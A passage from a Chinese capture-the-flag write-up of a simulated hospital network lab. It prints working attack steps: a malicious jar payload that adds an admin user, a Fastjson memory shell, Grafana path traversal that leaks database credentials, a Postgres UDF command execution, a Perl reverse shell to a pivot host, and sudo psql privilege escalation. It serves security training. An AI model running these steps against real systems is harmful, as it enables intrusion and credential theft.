class=\"hljs-keyword\"\u003ein\u003c/span\u003e=0) (out=0) (stored 0%)\nadding: META-INF/MANIFEST.MF (\u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e=56) (out=56) (stored 0%)\nadding: ./ (\u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e=0) (out=0) (stored 0%)\nadding: META-INF/ (\u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e=0) (out=0) (stored 0%)\nadding: META-INF/services/ (\u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e=0) (out=0) (stored 0%)\nadding: META-INF/services/javax.script.ScriptEngineFactory (\u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e=36) (out=38) (deflated -5%)\nadding: artsploit/ (\u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e=0) (out=0) (stored 0%)\nadding: artsploit/AwesomeScriptEngineFactory.class (\u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e=1698) (out=715) (deflated 57%)\nadding: artsploit/AwesomeScriptEngineFactory.java (\u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e=1589) (out=427) (deflated 73%)\nTotal:\n------\n(\u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e = 3363) (out = 2328) (deflated 30%)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eNacos的\u003ccode\u003edataid\u003c/code\u003e为\u003ccode\u003edb-config\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e因为内网机器不出网，所以我们要将\u003ccode\u003ejar\u003c/code\u003e包上传到靶机（172.30.12.5）上，然后在靶机上开启\u003ccode\u003eHTTP\u003c/code\u003e服务\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epython3 -m http.server 1234\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以看到内网服务器收到请求了，说明存在该漏洞\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e那么我们需要修改一下\u003ccode\u003epayload\u003c/code\u003e文件，原本的\u003ccode\u003epayload\u003c/code\u003e只是弹计算器，但是对于我们没有用，我们将其改为添加一个管理员用户\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e再打包一次\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e/usr/local/jdk1.8.0_202/bin/javac yaml-payload/src/artsploit/AwesomeScriptEngineFactory.java\njar -cvf yaml-payload2.jar -C yaml-payload/src/ .                                           \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e再次上传 \u003ccode\u003ejar\u003c/code\u003e 包，再打一次\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e之后可以通过\u003ccode\u003eRDP\u003c/code\u003e进行远程桌面登录，可以通过\u003ccode\u003enxe\u003c/code\u003e扫出来\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eadministrator\u003c/code\u003e家目录下能找到\u003ccode\u003eflag02\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eflag02: flag{e2500721-804b-4e8a-978d-aa37743d9f9b}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e信息收集\u003c/h3\u003e\n\u003cp\u003e查看域内用户信息，但是貌似不存在域\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eC:\\Users\\sunset\u003enet user /domain\n这项请求将在域 WORKGROUP 的域控制器处理。\n\n发生系统错误 1355。\n\n指定的域不存在，或无法联系。\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e172.30.12.236\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003efscan\u003c/code\u003e 有扫描到\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e[*] WebTitle http://172.30.12.236:8080 code:200 len:3964   title:医院后台管理平台\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e访问一下\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e尝试对其进行密码爆破，失败\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image13.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e目录爆破，扫出来的目录像是 \u003ccode\u003etomcat\u003c/code\u003e 的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/hospital  proxychains4 -q dirsearch -u http://172.30.12.236:8080 -x 403,404,429 -e php,zip,txt\n/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  from pkg_resources import DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0.4.3\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, zip, txt | HTTP method: GET | Threads: 25 | Wordlist size: 10439\n\nOutput File: /root/Desktop/test/hospital/reports/http_172.30.12.236_8080/_25-04-10_04-59-22.txt\n\nTarget: http://172.30.12.236:8080/\n\n[04:59:22] Starting: \n[04:59:30] 405 -    1KB - /;/login\n[04:59:30] 400 -    0B  - /\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd\n[04:59:31] 400 -    0B  - /a%5c.aspx\n[04:59:47] 302 -    0B  - /docs  -\u003e  /docs/\n[04:59:47] 200 -   17KB - /docs/\n[04:59:49] 302 -    0B  - /examples  -\u003e  /examples/\n[04:59:49] 200 -    1KB - /examples/\n[04:59:49] 200 -    6KB - /examples/servlets/index.html\n[04:59:49] 200 -  734B  - /examples/servlets/servlet/CookieExample\n[04:59:49] 200 -  722B  - /examples/jsp/snp/snoop.jsp\n[04:59:49] 200 -   14KB - /examples/jsp/index.html\n[04:59:49] 200 -    1KB - /examples/servlets/servlet/RequestHeaderExample\n[04:59:49] 200 -    1KB - /examples/websocket/index.xhtml\n[04:59:57] 405 -    1KB - /login\n[04:59:58] 302 -    0B  - /manager  -\u003e  /manager/\n\nTask Completed\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e访问 \u003ccode\u003edocs\u003c/code\u003e ，可以看到 \u003ccode\u003eTomcat\u003c/code\u003e版本是\u003ccode\u003e8.5.32\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image14.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e到这里一般都会想到后台\u003ccode\u003egetshell\u003c/code\u003e （打过的一台靶机：\u003cstrong\u003eCorrosion: 2\u003c/strong\u003e），但是拒绝访问了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image15.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003eFastjson 漏洞检测\u003c/h3\u003e\n\u003cp\u003e在登录页面测试，可以看到是传JSON的，测试一下是否存在\u003ccode\u003eFastjson\u003c/code\u003e漏洞，看到报错带有\u003ccode\u003eFastjson\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image16.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e检测漏洞，没报错，版本应该是\u003ccode\u003e1.2.47\u003c/code\u003e ：\u003ca href=\"https://github.com/safe6Sec/Fastjson\"\u003ehttps://github.com/safe6Sec/Fastjson\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image17.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003eFastjson 漏洞利用\u003c/h3\u003e\n\u003cp\u003e使用手动\u003ccode\u003eJndi_Tool\u003c/code\u003e没法成功（不知道哪里出了问题，尝试了几遍），所以这里直接使用Burp的插件\u003ccode\u003eFastjson-exp\u003c/code\u003e 直接注入内存马\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image18.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e使用哥斯拉进行连接\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image19.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e是\u003ccode\u003eroot\u003c/code\u003e权限\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image20.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e写入公钥，方便后面登录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"ssh-rsa xxxxxx\"\u003c/span\u003e \u003e .ssh/authorized_keys\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e在root目录下能拿到\u003ccode\u003eflag03.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@web03:~/flag# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e flag03.txt \n /$$   /$$                               /$$   /$$               /$$\n| $$  | $$                              |__/  | $$              | $$\n| $$  | $$  /$$$$$$   /$$$$$$$  /$$$$$$  /$$ /$$$$$$    /$$$$$$ | $$\n| $$$$$$$$ /$\u003cspan class=\"hljs-variable\"\u003e$__\u003c/span\u003e  $$ /$\u003cspan class=\"hljs-variable\"\u003e$_____\u003c/span\u003e/ /$\u003cspan class=\"hljs-variable\"\u003e$__\u003c/span\u003e  $$| $$|_  $\u003cspan class=\"hljs-variable\"\u003e$_\u003c/span\u003e/   |____  $$| $$\n| $\u003cspan class=\"hljs-variable\"\u003e$__\u003c/span\u003e  $$| $$  \\ $$|  $$$$$$ | $$  \\ $$| $$  | $$      /$$$$$$$| $$\n| $$  | $$| $$  | $$ \\____  $$| $$  | $$| $$  | $$ /$$ /$\u003cspan class=\"hljs-variable\"\u003e$__\u003c/span\u003e  $$| $$\n| $$  | $$|  $$$$$$/ /$$$$$$$/| $$$$$$$/| $$  |  $$$$/|  $$$$$$$| $$\n|__/  |__/ \\______/ |_______/ | $\u003cspan class=\"hljs-variable\"\u003e$____\u003c/span\u003e/ |__/   \\___/   \\_______/|__/\n                              | $$                                  \n                              | $$                                  \n                              |__/                                  \nflag03: flag{f2ba2c59-a4dc-4ea3-8036-037d1288fea6}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e信息收集\u003c/h3\u003e\n\u003cp\u003e双网卡主机，发现另外一个网段\u003ccode\u003e172.30.54.x\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@web03:~# ip add\n1: lo: \u0026#x3C;LOOPBACK,UP,LOWER_UP\u003e mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host \n       valid_lft forever preferred_lft forever\n2: eth0: \u0026#x3C;BROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu 1500 qdisc mq state UP group default qlen 1000\n    \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e/ether 00:16:3e:15:d0:ba brd ff:ff:ff:ff:ff:ff\n    inet 172.30.12.236/16 brd 172.30.255.255 scope global dynamic eth0\n       valid_lft 315357374sec preferred_lft 315357374sec\n    inet6 fe80::216:3eff:fe15:d0ba/64 scope \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e \n       valid_lft forever preferred_lft forever\n3: eth1: \u0026#x3C;BROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu 1500 qdisc mq state UP group default qlen 1000\n    \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e/ether 00:16:3e:15:d0:6a brd ff:ff:ff:ff:ff:ff\n    inet 172.30.54.179/24 brd 172.30.54.255 scope global eth1\n       valid_lft forever preferred_lft forever\n    inet6 fe80::216:3eff:fe15:d06a/64 scope \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e \n       valid_lft forever preferred_lft forever\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e上传 \u003ccode\u003efscan\u003c/code\u003e 进行扫描，新靶机开启着\u003ccode\u003e5432\u003c/code\u003e端口，是\u003ccode\u003ePostgreSQL\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@web03:~# ./fscan_1.8.4 -h 172.30.54.1-255\n\n   ___                              _    \n  / _ \\     ___  ___ _ __ __ _  ___| | __ \n / /_\\/____/ __|/ __| \u003cspan class=\"hljs-string\"\u003e'__/ _` |/ __| |/ /\n/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   \u0026#x3C;    \n\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\   \n                     fscan version: 1.8.4\nstart infoscan\n(icmp) Target 172.30.54.12    is alive\n(icmp) Target 172.30.54.179   is alive\n[*] Icmp alive hosts len is: 2\n172.30.54.179:22 open\n172.30.54.179:8009 open\n172.30.54.12:22 open\n172.30.54.12:3000 open\n172.30.54.12:5432 open\n172.30.54.179:8080 open\n[*] alive ports len is: 6\nstart vulscan\n[*] WebTitle http://172.30.54.12:3000  code:302 len:29     title:None 跳转url: http://172.30.54.12:3000/login\n[*] WebTitle http://172.30.54.179:8080 code:200 len:3964   title:医院后台管理平台\n[*] WebTitle http://172.30.54.12:3000/login code:200 len:27909  title:Grafana\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e二层代理搭建\u003c/h3\u003e\n\u003cp\u003e回到 VPS（隧道服务端）设置（\u003ccode\u003enode 0\u003c/code\u003e 是之前第一层代理）监听 \u003ccode\u003e10000\u003c/code\u003e 端口（在\u003ccode\u003e172.30.12.5\u003c/code\u003e中监听\u003ccode\u003e10000\u003c/code\u003e端口）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(node 0) \u003e\u003e listen\n[*] BE AWARE! If you choose IPTables Reuse or SOReuse,you MUST CONFIRM that the node you\u003cspan class=\"hljs-string\"\u003e're controlling was started in the corresponding way!\n[*] When you choose IPTables Reuse or SOReuse, the node will use the initial config(when node started) to reuse port!\n[*] Please choose the mode(1.Normal passive/2.IPTables Reuse/3.SOReuse): 1\n[*] Please input the [ip:]\u0026#x3C;port\u003e : 10000\n[*] Waiting for response......\n[*] Node is listening on 10000\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e上传\u003ccode\u003estowaway\u003c/code\u003e 客户端到 \u003ccode\u003eweb03\u003c/code\u003e ，并连接 \u003ccode\u003e172.30.12.5:10000\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@web03:~# ./linux_x64_agent -c 172.30.12.5:10000 -s 123123 --reconnect 8\n2025/04/15 20:40:12 [*] Starting agent node actively.Connecting to 172.30.12.5:10000.Reconnecting every 8 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e服务端接收到新节点\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(node 0) \u003e\u003e \n[*] New node online! Node \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e is 1\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(admin) \u003e\u003e detail\nNode[0] -\u003e IP: 39.99.227.193:36978  Hostname: web01  User: app\nMemo: \n\nNode[1] -\u003e IP: 172.30.12.236:52454  Hostname: web03  User: root\nMemo:\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e设置 \u003ccode\u003esocks\u003c/code\u003e 节点\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(admin) \u003e\u003e use 1\n(node 1) \u003e\u003e socks 1081 admin admin\n[*] Trying to listen on 0.0.0.0:1081......\n[*] Waiting \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e agent\u003cspan class=\"hljs-string\"\u003e's response......\n[*] Socks start successfully!\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e测试，修改\u003ccode\u003eProxifier\u003c/code\u003e 配置文件为新的\u003ccode\u003esocks\u003c/code\u003e服务，访问\u003ccode\u003e172.30.54.12:3000\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image21.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e172.30.54.12\u003c/h2\u003e\n\u003cp\u003e搭建着\u003ccode\u003eGrafana\u003c/code\u003e ，数据可视化应用程序平台\u003c/p\u003e\n\u003ch3\u003e漏洞利用\u003c/h3\u003e\n\u003cp\u003e在网上进行搜索，发现存在漏洞 \u003cstrong\u003eCVE-2021-43798 Grafana 未经授权的任意文件读取漏洞\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e链接：\u003ca href=\"https://blog.csdn.net/Jietewang/article/details/121961312\"\u003ehttps://blog.csdn.net/Jietewang/article/details/121961312\u003c/a\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e/public/plugins/alertlist/../../../../../../../../etc/passwd\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image22.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e使用工具梭哈，上传到\u003ccode\u003e172.30.12.236\u003c/code\u003e，获得\u003ccode\u003epostgres\u003c/code\u003e数据库账号密码\u003c/p\u003e\n\u003cp\u003e工具链接：\u003ca href=\"https://github.com/A-D-Team/grafanaExp\"\u003ehttps://github.com/A-D-Team/grafanaExp\u003c/a\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@web03:~# ./linux_amd64_grafanaExp  exp -u http://172.30.54.12:3000\n2025/01/24 15:01:22 Target vulnerable has plugin [alertlist]\n2025/01/24 15:01:22 Got secret_key [SW2YcwTIb9zpOOhoPsMm]\n2025/01/24 15:01:22 There is [0] records \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e db.\n2025/01/24 15:01:22 \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e:[postgres]     name:[PostgreSQL]               url:[localhost:5432]    user:[postgres] password[Postgres@123]database:[postgres]      basic_auth_user:[]      basic_auth_password:[]\n2025/01/24 15:01:22 All Done, have \u003cspan class=\"hljs-built_in\"\u003enice\u003c/span\u003e day!\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003ePostgres UDF\u003c/h3\u003e\n\u003cp\u003e使用MDUT进行利用，最后可以正常进行连接，但是无法进行漏洞利用\u003c/p\u003e\n\u003cp\u003e所这里手动进行\u003ccode\u003eUDF\u003c/code\u003e提权\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eCREATE FUNCTION system(cstring) RETURNS int AS \u003cspan class=\"hljs-string\"\u003e'/lib/x86_64-linux-gnu/libc.so.6'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'system'\u003c/span\u003e LANGUAGE C STRICT;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后进行反弹\u003ccode\u003eshell\u003c/code\u003e，使用反弹\u003ccode\u003eshell\u003c/code\u003e生成器来尝试，最后使用\u003ccode\u003eperl\u003c/code\u003e成功反弹\u003c/p\u003e\n\u003cp\u003e反弹\u003ccode\u003eshell\u003c/code\u003e生成器：\u003ca href=\"https://www.ddosi.org/shell/\"\u003ehttps://www.ddosi.org/shell/\u003c/a\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-keyword\"\u003eselect\u003c/span\u003e system(\u003cspan class=\"hljs-string\"\u003e'perl -e \\'\u003c/span\u003euse Socket;\u003cspan class=\"hljs-variable\"\u003e$i\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"172.30.54.179\"\u003c/span\u003e;\u003cspan class=\"hljs-variable\"\u003e$p\u003c/span\u003e=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\u003cspan class=\"hljs-string\"\u003e\"tcp\"\u003c/span\u003e));\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(connect(S,sockaddr_in(\u003cspan class=\"hljs-variable\"\u003e$p\u003c/span\u003e,inet_aton(\u003cspan class=\"hljs-variable\"\u003e$i\u003c/span\u003e)))){open(STDIN,\u003cspan class=\"hljs-string\"\u003e\"\u003e\u0026#x26;S\"\u003c/span\u003e);open(STDOUT,\u003cspan class=\"hljs-string\"\u003e\"\u003e\u0026#x26;S\"\u003c/span\u003e);open(STDERR,\u003cspan class=\"hljs-string\"\u003e\"\u003e\u0026#x26;S\"\u003c/span\u003e);\u003cspan class=\"hljs-built_in\"\u003eexec\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"sh -i\"\u003c/span\u003e);};\\'\u003cspan class=\"hljs-string\"\u003e');\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@web03:~# nc -lvnp 1234\nListening on 0.0.0.0 1234\n\u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nConnection received on 172.30.54.12 42368\nsh: 0: can\u003cspan class=\"hljs-string\"\u003e't access tty; job control turned off\n$ uid=112(postgres) gid=124(postgres) groups=124(postgres),123(ssl-cert)\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epython3 -c \u003cspan class=\"hljs-string\"\u003e\"import pty;pty.spawn('/bin/bash')\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e postgres on web04:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser postgres may run the following commands on web04:\n    (ALL) NOPASSWD: /usr/local/postgresql/bin/psql\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e在\u003ccode\u003eGTFobins\u003c/code\u003e查看利用\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image23.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e登陆时提示：\u003ccode\u003epsql: FATAL:  password authentication failed for user \"root\"\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epostgres@web04:/usr/local/pgsql/data$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e /usr/local/postgresql/bin/psql                                         \n\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e /usr/local/postgresql/bin/psql            \nPassword: Postgres@123root  \n\npsql: FATAL:  password authentication failed \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e user \u003cspan class=\"hljs-string\"\u003e\"root\"\u003c/span\u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可能是密码不匹配，我们将其密码修改为\u003ccode\u003e123456\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ealter user root with password \u003cspan class=\"hljs-string\"\u003e'123456'\u003c/span\u003e;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e再次进行利用\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epostgres@web04:/usr/local/pgsql/data$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e /usr/local/postgresql/bin/psql\n\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e /usr/local/postgresql/bin/psql\nPassword: 123456\n\nWelcome to psql 8.1.0, the PostgreSQL interactive terminal.\n\nType:  \\copyright \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e distribution terms\n       \\h \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e with SQL commands\n       \\? \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e with psql commands\n       \\g or terminate with semicolon to execute query\n       \\q to quit\n\nroot-# \\?\n\\?\nGeneral\n  \\c[onnect] [DBNAME|- [USER]]\n                 connect to new database (currently \u003cspan class=\"hljs-string\"\u003e\"root\"\u003c/span\u003e)\n  \\\u003cspan class=\"hljs-built_in\"\u003ecd\u003c/span\u003e [DIR]      change the current working directory\n  \\copyright     show PostgreSQL usage and distribution terms\n  \\encoding [ENCODING]\n                 show or \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e client encoding\n  \\h [NAME]      \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e on syntax of SQL commands, * \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e all commands\n  \\q             quit psql\n  \\\u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e [NAME [VALUE]]\n                 \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e internal variable, or list all \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e no parameters\n  \\timing        toggle timing of commands (currently off)\n  \\\u003cspan class=\"hljs-built_in\"\u003eunset\u003c/span\u003e NAME    \u003cspan class=\"hljs-built_in\"\u003eunset\u003c/span\u003e (delete) internal variable\n  \\! [COMMAND]   execute \u003cspan class=\"hljs-built_in\"\u003ecommand\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e shell or start interactive shell\n\nQuery Buffer\n  \\e [FILE]      edit the query buffer (or file) with external editor\n  \\g [FILE]      send query buffer to server (and results to file or |pipe)\n  \\p             show the contents of the query buffer\n  \\r             reset (clear) the query buffer\n  \\w FILE        write query buffer to file\n\nInput/Output\n--More--!/bin/sh\n!/bin/sh\n\u003cspan class=\"hljs-comment\"\u003e# id\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=0(root) gid=0(root) \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e=0(root)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e读取\u003ccode\u003eflag\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-comment\"\u003e# cat flag04.txt\u003c/span\u003e\n                                           ,,                   ,,  \n`7MMF\u003cspan class=\"hljs-string\"\u003e'  `7MMF'\u003c/span\u003e                             db   mm            `7MM  \n  MM      MM                                    MM              MM  \n  MM      MM  ,pW\u003cspan class=\"hljs-string\"\u003e\"Wq.  ,pP\"\u003c/span\u003eYbd `7MMpdMAo.`7MM mmMMmm  ,6\u003cspan class=\"hljs-string\"\u003e\"Yb.    MM  \n  MMmmmmmmMM 6W'   `Wb 8I   `\"\u003c/span\u003e   MM   `Wb  MM   MM   8)   MM    MM  \n  MM      MM 8M     M8 `YMMMa.   MM    M8  MM   MM    ,pm9MM    MM  \n  MM      MM YA.   ,A9 L.   I8   MM   ,AP  MM   MM   8M   MM    MM  \n.JMML.  .JMML.`Ybmd9\u003cspan class=\"hljs-string\"\u003e'  M9mmmP'\u003c/span\u003e   MMbmmd\u003cspan class=\"hljs-string\"\u003e' .JMML. `Mbmo`Moo9^Yo..JMML.\n                                 